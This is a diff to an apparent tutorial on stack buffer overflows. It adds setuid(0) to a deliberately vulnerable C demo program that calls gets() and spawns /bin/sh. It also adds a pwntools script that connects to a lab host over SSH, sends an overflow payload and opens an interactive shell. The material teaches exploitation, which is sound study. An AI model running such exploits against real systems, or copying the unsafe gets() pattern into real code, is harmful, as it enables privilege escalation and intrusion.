@@ -119,6 +119,7 @@ int main(int argc, char *argv[]){
   // vulnerable
   gets(vuln_buff);
   if (access == 1234){
+    setuid(0);
     system("/bin/sh");
   }
   return 0;
@@ -156,4 +157,25 @@ So, your final exploit:
 
 And you will get a shell, but you will be you, not the other user or root. Yeah, in this kind of program, the vulnerability is useless for an attacker, but if it has a `suid` bit set(`chmod ug+s buffer-overflow` as another user), he can get a root or another user privilege. But, if a program with some network interactions has this vulnerability, then the attacker can get Remote Code Execution or RCE, even if the program doesn't have a suid on root or other user. Also, the main reason for RCE here is condition which gives a shell, but even so, this vulnerability opens a thread to further exploitation.
 
-- [ ] Setup a virtual machine and put this program in its environment, then show the exploitation again.
+
+### Remote exploit with pwntools
+
+Here the exploit to this program using `pwntools` python module:
+```python
+from pwn import *
+
+# Connect to target via ssh
+con = ssh('user', '192.168.43.61', password='user', port=22)
+# Execute a vulnerable program
+p = con.process('./buffer-overflow')
+# Payload
+payload = "A"*108 + "\xd2\x04"
+# Send payload
+p.sendline(payload)
+# To attach with gdb to remote process
+#gdb.attach(p, "b *main")
+# Now, you can work with shell interactively
+p.interactive()
+```
+
+One difference here is the offset between the buffer and the value to overwrite. This offset often can be different from local exploit.
